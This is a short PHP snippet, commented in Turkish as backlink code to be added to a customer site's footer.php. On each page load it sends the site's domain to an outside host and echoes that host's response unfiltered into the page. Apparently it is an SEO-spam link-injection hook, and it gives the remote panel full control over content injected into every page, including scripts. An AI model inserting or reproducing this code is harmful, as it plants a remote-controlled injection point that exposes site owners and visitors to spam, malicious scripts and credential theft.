<?php
// Backlink kodu - Müşteri sitesinin footer.php dosyasına eklenecek
$domain = $_SERVER['HTTP_HOST'];
$domain = preg_replace('/^www\./', '', strtolower(trim($domain)));
$backlinks = @file_get_contents('https://batuna.vn/aa/panel/api/client-backlinks.php?site=' . urlencode($domain));
echo $backlinks;
?>